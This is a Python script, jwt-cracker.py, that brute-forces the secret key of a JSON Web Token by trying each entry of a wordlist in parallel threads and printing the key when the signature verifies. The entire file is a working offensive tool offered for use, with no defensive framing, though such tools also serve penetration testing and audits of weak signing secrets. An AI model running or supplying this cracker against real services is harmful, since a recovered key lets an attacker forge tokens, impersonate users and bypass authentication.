# jwt-cracker.py
# Crack JWT using brute-force via a wordlist.

import argparse
import jwt
import sys
import threading
import time
try:
    import Queue as queue
except ImportError:
    import queue

is_Found = False
attempts_counter = 0
previous_printed_progres = None


def check(token, key):
    global is_Found, attempts_counter
    attempts_counter += 1
    try:
        jwt.decode(token, key)
        sys.stdout.write("[#] KEY FOUND: %s\n" % (key))
        sys.stdout.flush()
        is_Found = True
    except jwt.exceptions.InvalidSignatureError:
        pass


def group_check(token, wordlist):
    global is_Found
    for _ in wordlist:
        check(token, _)
        if is_Found is True:
            break


def print_progress(wordlist_size):
    global is_Found, attempts_counter, previous_printed_progres
    while True:
        time.sleep(1)
        if is_Found is True:
            break
        current_progress = ((float(attempts_counter) / float(wordlist_size)) *
                            100.00)
        current_progress = round(current_progress, 2)
        if (previous_printed_progres is not None) and \
           (previous_printed_progres != current_progress):
            if (round(current_progress, 0) % 5) == 0:
                sys.stdout.write("[Progress]: %s\n" % (current_progress))
                sys.stdout.flush()
        previous_printed_progres = current_progress


def split_list(alist, wanted_parts=1):
    # Source: https://stackoverflow.com/questions/752308/split-list-into-smaller-lists/23148997
    length = len(alist)
    return [alist[i * length // wanted_parts: (i + 1) * length // wanted_parts]
            for i in range(wanted_parts)]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-jwt", "--jwt",
                        required=True,
                        dest="jwt_token",
                        help="JWT.",
                        action="store")
    parser.add_argument("-w", "--wordlist",
                        required=True,
                        dest="wordlist_file",
                        help="Wordlist.",
                        action="store")
    parser.add_argument("-t", "--threads",
                        dest="threads_number",
                        help="The number of threads [Default: 10]",
                        default="10",
                        action="store")
    args = parser.parse_args()

    wordlist = open(args.wordlist_file, "r").readlines()
    wordlist = [_.replace("\r", "").replace("\n", "") for _ in wordlist]
    wordlist_Q = queue.Queue()
    wordlist_grouped = split_list(wordlist,
                                  wanted_parts=int(args.threads_number))
    for _ in wordlist_grouped:
        wordlist_Q.put(_)
    wordlit_size = len(wordlist)
    del wordlist, wordlist_grouped
    sys.stdout.write("[info] Loaded wordlist.\n")
    sys.stdout.flush()
    threads_state = []
    t = threading.Thread(target=print_progress, args=(wordlit_size,))
    t.start()
    threads_state.append(t)
    sys.stdout.write("[info] starting brute-forcing.\n")
    sys.stdout.flush()
    while (is_Found is False) and (wordlist_Q.empty() is False):
        if threading.active_count() < (int(args.threads_number) + 2):
            q = wordlist_Q.get()
            t = threading.Thread(target=group_check, args=(args.jwt_token, q,))
            t.start()
            threads_state.append(t)
        else:
            time.sleep(0.20)
    for t in threads_state:
        t.join()
    if is_Found is False:
        sys.stdout.write("[#] Key not Found.")
        sys.stdout.flush()

if __name__ == "__main__":
    main()
